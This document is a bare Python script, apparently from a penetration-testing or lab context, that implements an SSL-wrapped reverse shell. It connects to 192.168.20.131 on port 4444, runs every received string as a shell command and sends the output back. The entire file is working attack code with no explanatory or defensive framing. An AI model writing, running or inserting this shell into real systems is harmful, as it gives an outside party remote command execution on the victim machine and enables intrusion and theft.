import socket,subprocess,os,ssl
so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
so.connect(('192.168.20.131',4444))
s=ssl.wrap_socket(so)
Pz=False
while not Pz:
	data=s.recv(1024)
	if len(data)==0:
		Pz = True
	proc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
	stdout_value=proc.stdout.read() + proc.stderr.read()
	s.sendall(stdout_value)
